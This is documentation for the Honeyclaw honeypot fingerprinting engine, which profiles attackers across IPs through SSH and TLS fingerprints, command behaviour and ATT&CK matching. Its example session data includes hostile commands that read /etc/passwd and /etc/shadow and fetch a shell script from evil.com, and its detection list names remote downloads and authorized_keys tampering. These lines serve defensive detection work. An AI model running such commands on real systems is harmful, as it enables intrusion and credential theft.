# Honeyclaw Attacker Fingerprinting Engine

The fingerprinting engine builds unique attacker profiles that can identify the same attacker across different IPs, sessions, and even time periods.

## Overview

Traditional honeypots log attackers by IP address. This is increasingly useless as attackers use:
- VPNs and proxy chains
- Tor exit nodes  
- Compromised systems as jump boxes
- Cloud instances spun up per-attack

The fingerprinting engine solves this by creating multi-dimensional attacker profiles based on:

1. **Protocol Fingerprints** - SSH client configuration, TLS parameters (JA3/JA4)
2. **Behavioral Patterns** - Command sequences, timing, typos
3. **Tool Signatures** - Known scanner/exploit tool indicators

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Fingerprint Engine                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │ SSH Extractor│  │HTTP Extractor│  │  Behavior    │          │
│  │              │  │              │  │  Extractor   │          │
│  │ • Version    │  │ • JA3/JA4    │  │              │          │
│  │ • KEX algs   │  │ • Headers    │  │ • Commands   │          │
│  │ • Ciphers    │  │ • User-Agent │  │ • Timing     │          │
│  │ • MACs       │  │ • TLS params │  │ • Typos      │          │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘          │
│         │                 │                 │                   │
│         └─────────────────┼─────────────────┘                   │
│                           ▼                                     │
│                  ┌─────────────────┐                            │
│                  │ Profile Matcher │                            │
│                  │                 │                            │
│                  │ • Similarity    │                            │
│                  │ • Correlation   │                            │
│                  │ • TTP Matching  │                            │
│                  └────────┬────────┘                            │
│                           │                                     │
│                           ▼                                     │
│                  ┌─────────────────┐                            │
│                  │ Attacker Profile│                            │
│                  │                 │                            │
│                  │ ATK-XXXX-YYYY   │                            │
│                  │ threat_level    │                            │
│                  │ known_ips[]     │                            │
│                  │ ttp_matches[]   │                            │
│                  └─────────────────┘                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │   Database      │
                  │   (SQLite)      │
                  │                 │
                  │ • Profiles      │
                  │ • Fingerprints  │
                  │ • IP mappings   │
                  └─────────────────┘
```

## Usage

### Basic Integration

```python
from honeyclaw.fingerprint import FingerprintEngine, FingerprintDatabase

# Initialize with database for persistence
db = FingerprintDatabase('/path/to/fingerprints.db')
engine = FingerprintEngine(database=db)

# Process a new session
profile = engine.process_session({
    'ip': '192.168.1.100',
    'protocol': 'ssh',
    'timestamp': time.time(),
    'ssh_version': 'SSH-2.0-libssh2_1.10.0',
    'commands': [
        {'command': 'whoami', 'timestamp': 1234567890.0},
        {'command': 'cat /etc/passwd', 'timestamp': 1234567891.5},
        {'command': 'wget http://evil.com/shell.sh', 'timestamp': 1234567895.0},
    ]
})

# Add fingerprint data to your logs
log_entry = {
    'event': 'login_attempt',
    'ip': '192.168.1.100',
    **profile.to_log_entry()
}
```

### SSH Honeypot Integration

```python
from honeyclaw.fingerprint import FingerprintEngine

engine = FingerprintEngine()

class HoneypotServer(asyncssh.SSHServer):
    def connection_made(self, conn):
        # Get fingerprint from connection
        profile = engine.process_ssh_connection(
            ip=conn.get_extra_info('peername')[0],
            version_string=conn.get_extra_info('client_version'),
            conn=conn  # AsyncSSH connection object
        )
        
        # Log with attacker ID
        self.attacker_id = profile.attacker_id
        log_event('connection', {
            'ip': self.client_ip,
            'attacker_id': profile.attacker_id,
            'threat_level': profile.threat_level,
        })
```

### Adding Command Data

```python
# After session, add command history
profile = engine.add_commands(
    attacker_id='ATK-ABCD1234-5678',
    commands=[
        {'command': 'ls -la', 'timestamp': 1234567890.0},
        {'command': 'cat /etc/shadow', 'timestamp': 1234567891.2},
    ]
)
```

## CLI Commands

### Show Attacker Profile

```bash
honeyclaw fingerprint show ATK-ABCD1234-5678
```

Output:
```
======================================================================
ATTACKER PROFILE: ATK-ABCD1234-5678
======================================================================

Overview:
  Threat Level:    HIGH
  Confidence:      95.2%
  First Seen:      2024-01-15 03:42:18
  Last Seen:       2024-01-15 04:15:33
  Sessions:        7

Known IPs:
  • 192.168.1.100
  • 10.0.0.55
  • 172.16.0.23

Identified Tools:
  • ssh:libssh2
  • http:python-requests

TTPs Detected:
  • T1087_account_discovery
  • T1105_ingress_transfer
  • T1098_ssh_key_backdoor

SSH Fingerprints:
  [1] Client: libssh2_1.10.0
      Hash: 4a8b2c1f3e5d6a7b
      KEX: curve25519-sha256, ecdh-sha2-nistp256, diffie-hellman-group14-sha256...
```

### List Attackers

```bash
# All recent attackers
honeyclaw fingerprint list

# Filter by threat level
honeyclaw fingerprint list --threat-level=critical

# JSON output
honeyclaw fingerprint list --json
```

### Search

```bash
# By IP
honeyclaw fingerprint search --ip=192.168.1.100

# By TTP
honeyclaw fingerprint search --ttp=T1087_account_discovery

# By tool
honeyclaw fingerprint search --tool=hydra
```

### Find Similar Attackers

```bash
honeyclaw fingerprint correlate ATK-ABCD1234-5678
```

### Database Statistics

```bash
honeyclaw fingerprint stats
```

## Fingerprint Types

### SSH Fingerprint

The SSH fingerprint captures:

| Component | Description | Weight |
|-----------|-------------|--------|
| Client Version | SSH-2.0-libssh2_1.10.0 | 15% |
| KEX Algorithms | Key exchange algorithm order | 25% |
| Ciphers | Encryption algorithm preferences | 25% |
| MACs | Message authentication codes | 15% |
| Host Keys | Accepted host key types | 10% |
| Compression | Compression preferences | 10% |

The order of algorithms is significant - different SSH libraries have different default orderings.

### HTTP/TLS Fingerprint (JA3/JA4)

For HTTP services, we capture:

- **JA3 Hash**: MD5 of TLS Client Hello parameters
- **JA4 Hash**: Enhanced fingerprint with ALPN, extensions
- **Header Order**: Order of HTTP headers (libraries differ!)
- **User-Agent**: Direct identification
- **Accept patterns**: Accept-Encoding, Accept-Language

### Behavioral Fingerprint

Attackers have habits:

| Pattern | What it reveals |
|---------|-----------------|
| Command sequence | Playbook/tool being used |
| Command timing | Human vs automated |
| Typos | Human operator, skill level |
| Phase progression | recon → exploit → persist |
| Time of day | Timezone, work schedule |

## TTP Detection

The engine matches command sequences against known MITRE ATT&CK patterns:

- `T1087` Account Discovery - `whoami`, `id`, `/etc/passwd`
- `T1083` File Discovery - `ls`, `find`, `locate`
- `T1082` System Discovery - `uname`, `hostname`
- `T1105` Ingress Tool Transfer - `wget`, `curl` downloads
- `T1053` Scheduled Task - crontab modifications
- `T1098` SSH Authorized Keys - `.ssh/authorized_keys` access

## Threat Level Assessment

Profiles are automatically scored:

| Level | Score | Indicators |
|-------|-------|------------|
| Critical | ≥50 | Known attack tools, malicious JA3 |
| High | ≥30 | TTPs detected, multiple indicators |
| Medium | ≥15 | Some suspicious patterns |
| Low | <15 | Basic probing, no clear intent |

## Database Schema

The SQLite database stores:

```sql
-- Core profiles
profiles (attacker_id, first_seen, last_seen, threat_level, ...)

-- All fingerprint hashes for fast lookup
fingerprints (hash, attacker_id, fingerprint_type)

-- IP to attacker mapping
ip_associations (ip, attacker_id, first_seen, last_seen)

-- Individual sessions
sessions (session_id, attacker_id, ip, timestamp, ...)

-- TTP detections
ttp_detections (attacker_id, ttp_id, detected_at)
```

## Best Practices

1. **Enable fingerprinting for all protocols** - More data = better correlation
2. **Log commands with timestamps** - Enables behavioral analysis
3. **Run periodic correlations** - Find related attackers
4. **Export high-threat profiles** - Share with threat intel

## Privacy Considerations

The fingerprinting engine does NOT store:
- Passwords (only hashes)
- Exact keystroke timings (only aggregated)
- Full command arguments (normalized)

## Performance

- Profile matching: O(log n) with hash index
- Similarity search: O(n) for full scan, use sparingly
- Database: SQLite with WAL mode for concurrent access

For high-volume deployments, consider:
- Periodic cleanup of old profiles
- Archiving inactive attackers
- Using PostgreSQL for distributed setups
